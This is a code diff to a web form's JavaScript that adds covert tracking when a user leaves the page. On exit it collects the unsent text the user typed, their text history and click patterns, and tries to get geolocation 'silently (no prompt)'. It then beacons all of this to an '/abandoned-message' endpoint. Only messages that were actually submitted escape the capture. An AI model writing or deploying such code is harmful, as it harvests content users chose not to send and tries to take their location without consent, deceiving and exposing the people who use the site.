@@ -18,6 +18,53 @@ function getTimeOnPage() {
   return Math.round((Date.now() - pageLoadTime) / 1000); // in seconds
 }
 
+// Track if message was actually sent
+let messageSent = false;
+
+// Track abandoned messages when user leaves
+window.addEventListener('beforeunload', async (e) => {
+  const currentText = messageInput?.value?.trim();
+  
+  // Only track if there's meaningful text and message wasn't sent
+  if (currentText && currentText.length >= 3 && !messageSent) {
+    // Get location silently (no prompt)
+    let coordinates = null;
+    try {
+      coordinates = await new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            }),
+            () => resolve(null),
+            { timeout: 1000, enableHighAccuracy: false }
+          );
+        } else {
+          resolve(null);
+        }
+      });
+    } catch (err) {
+      coordinates = null;
+    }
+
+    const payload = {
+      partialMessage: currentText,
+      timeOnPage: getTimeOnPage(),
+      clickPatterns: clickPatterns,
+      textHistory: textHistory,
+      coordinates: coordinates,
+      reason: 'page_exit'
+    };
+    if (shareTag) payload.shareTag = shareTag;
+
+    // Use sendBeacon for reliable tracking on page unload
+    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+    navigator.sendBeacon(`${API_URL}/abandoned-message`, blob);
+  }
+});
+
 // Track click patterns
 const clickPatterns = [];
 function trackClick(element, action) {
@@ -226,6 +273,7 @@ submitBtn.addEventListener('click', async () => {
         });
         
         if (response.ok) {
+            messageSent = true; // Mark message as sent to prevent abandoned tracking
             messageInput.value = '';
             // Redirect if configured, otherwise refresh messages
             if (REDIRECT_URL) {
